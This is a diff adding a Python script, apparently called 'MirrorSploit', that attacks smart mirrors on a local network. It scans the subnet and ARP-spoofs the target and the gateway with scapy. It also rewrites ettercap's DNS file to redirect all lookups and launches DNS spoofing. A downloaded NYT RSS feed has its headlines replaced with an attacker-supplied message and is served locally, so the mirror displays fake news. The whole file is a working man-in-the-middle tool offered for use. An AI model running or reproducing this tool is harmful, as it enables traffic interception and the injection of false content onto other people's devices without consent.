@@ -1,0 +1,194 @@
+#!/usr/bin/env python
+import scapy
+import shutil
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+import netifaces
+import threading
+import requests
+import urllib
+import socket
+import socks
+import re
+import os
+sys.stdout.write("Coded and Developed by Blackhole Security (Instagram: @SSploit)\n")
+sys.stdout.flush()
+def exit_():
+	try:
+		exit(0)
+	except:
+		sys.exit(1)
+title = raw_input("Message to replace hijacked news feed with => ")
+def modify_news_alerts(title):
+	sys.stdout.write('[*] Retrieving News Feed Source...\n')
+	sys.stdout.flush()
+	if(os.path.exists('HomePage.xml')):
+		os.remove('HomePage.xml')
+	try:
+		urllib.urlretrieve('http://www.nytimes.com/services/xml/rss/nyt/HomePage.xml','HomePage.xml')
+		sys.stdout.write("[*] Retrieval Successful.\n")
+	except:
+		sys.stdout.write("[-] Error. Unable to retrieve news feed source.\n")
+		exit_()
+	sys.stdout.write("[*] Modifying Source.\n")
+	with open('HomePage.xml', 'r') as hp:
+		for line in hp:
+			if('<title>' in line):
+				data = str(line.strip().split('<title>')[1]).split('</title>')[0]
+				line = re.sub('<title>'+data+'</title>','<title>'+title+'</title>',line)
+			with open('ndata.xml', 'a') as nd:
+				nd.write(line)
+				nd.close()
+	sys.stdout.write("[*] Source Successfully Modified.\n")
+	sys.stdout.flush()
+	sys.stdout.write("[*] Creating New Source.\n")
+	if(os.path.exists('/var/www/html/services/xml/rss/nyt/')):
+		if(os.path.exists('/var/www/html/services/xml/rss/nyt/HomePage.xml')):
+			os.remove('/var/www/html/services/xml/rss/nyt/HomePage.xml')
+			try:
+				shutil.copyfile('ndata.xml','/var/www/html/services/xml/rss/nyt/HomePage.xml')
+			except:
+				exit_()
+		else:
+			try:
+				shutil.copyfile('ndata.xml','/var/www/html/services/xml/rss/nyt/HomePage.xml')
+			except:
+				sys.stdout.write("[*] Unable to create new source.\n")
+				exit_()
+	else:
+		try:
+			os.makedirs('/var/www/html/services/xml/rss/nyt/')
+		except:
+			sys.stdout.write("[*] Unable to create new source.\n")
+			exit_()
+		try:
+			shutil.copyfile('ndata.xml','/var/www/html/services/xml/rss/nyt/HomePage.xml')
+		except:
+			sys.stdout.write("[*] Unable to create new source.\n")
+			exit_()
+	try:
+		os.remove('ndata.xml')
+	except:
+		pass
+	try:
+		os.remove('HomePage.xml')
+	except:
+		pass
+	sys.stdout.write("[*] New Source Successfully Created.\n")
+	sys.stdout.flush()
+def scan_network(ip_range):
+	ip_base = ip_range.split('/')[0]
+	ip_end = ip_range.split('/')[1]
+	count = 0
+	ip_base_addr = ''
+	for char in ip_base:
+		if(count == 3):
+			break;
+		if(char == '.'):
+			count += 1
+		ip_base_addr += char
+	capt_addrs = []
+	for i in range(int(ip_end)):
+		try:
+			socket.gethostbyaddr(ip_base_addr + str(i))
+			capt_addrs.append(ip_base_addr + str(i))
+		except:
+			pass
+	if(len(capt_addrs) > 0):
+		return capt_addrs
+	else:
+		return False
+def resolve_name_addr(addr):
+	try:
+		hname = socket.gethostbyaddr(addr)[0]
+	except:
+		hname = 'unknown'
+	return hname
+sys.stdout.write("1.) Scan for smart mirror\n2.) Input Smart Mirror Address\n")
+sys.stdout.flush()
+while True:
+	s_or_m = raw_input("MirrorSploit> ")
+	if(s_or_m == '2'):
+		scan_n = False
+		break;
+	elif(s_or_m == '1'):
+		scan_n = True
+		break;
+	else:
+		sys.stdout.write("Invalid Option.\n")
+		sys.stdout.flush()
+if(scan_n == True):
+	data_index = scan_network('192.168.1.1/244')
+	dev_array = []
+	if(data_index != False):
+		for val in data_index:
+			dev_array.append(val + '_hname_' + resolve_name_addr(val))
+	else:
+		sys.stdout.write("0 Devices Found.\n")
+		sys.stdout.flush()
+		try:
+			exit(0)
+		except:
+			sys.exit(1)
+	count = 0
+	for val in dev_array:
+		sys.stdout.write("["+str(count)+"] {:1} ({:1})\n".format(val.split('_hname_')[0],val.split('_hname_')[1]))
+		sys.stdout.flush()
+		count += 1
+	n_val = 0
+	while True:
+		rval = raw_input("MirrorSploit:Select Device> ")
+		try:
+			dev_array[int(rval)]
+			n_val = 1
+			break;
+		except:
+			sys.stdout.write("Select Device ID.\n")
+			sys.stdout.flush()
+	if(n_val != 1):
+		try:
+			exit(0)
+		except:
+			sys.exit(1)
+	dev_name = str(dev_array[int(rval)]).split('_hname_')[1]
+	dev_addr = str(dev_array[int(rval)]).split('_hname_')[0]
+
+elif(scan_n == False):
+	dev_addr = raw_input("SmartMirror IP Address=> ")
+	try:
+		dev_name = socket.gethostbyaddr(dev_addr)[0]
+	except:
+		dev_name = 'unknown'
+iface_addr = netifaces.gateways()[netifaces.AF_INET][0][1]
+gateway_addr = netifaces.gateways()[netifaces.AF_INET][0][0]
+def run_e(iface_addr):
+	l_addr = netifaces.ifaddresses(iface_addr)[netifaces.AF_INET][0]['addr']
+	with open('/etc/ettercap/etter.dns', 'w+') as e_handler:
+		e_handler.write('* A '+str(l_addr))
+		e_handler.close()
+	cmd = 'ettercap -i '+iface_addr+' -T -q -P dns_spoof > /dev/null'
+	subprocess.call(cmd,shell=True)
+def send_payload0(g,ia,targ):
+	pck = ARP(psrc=g,pdst=targ)
+	while True:
+		send(pck,iface=ia,inter=2,count=1,verbose=False)
+def send_payload1(g,ia,targ):
+	pck = ARP(psrc=targ,pdst=g)
+	while True:
+		send(pck,iface=ia,inter=2,count=1,verbose=False)
+sys.stdout.write("[*] Exploiting {:1}\n".format(dev_addr))
+sys.stdout.flush()
+t = threading.Thread(target=send_payload0,args=(gateway_addr,iface_addr,dev_addr,))
+t.setDaemon(True)
+t.start()
+t1 = threading.Thread(target=send_payload0,args=(gateway_addr,iface_addr,dev_addr,))
+t1.setDaemon(True)
+t1.start()
+modify_news_alerts(title)
+sys.stdout.write("[*] Hijacking News Feed.\n")
+tx = threading.Thread(target=run_e, args=(iface_addr,))
+tx.setDaemon(True)
+tx.start()
+sys.stdout.write("[*] Exploit Running. Check Mirror.\n")
+x = raw_input("")
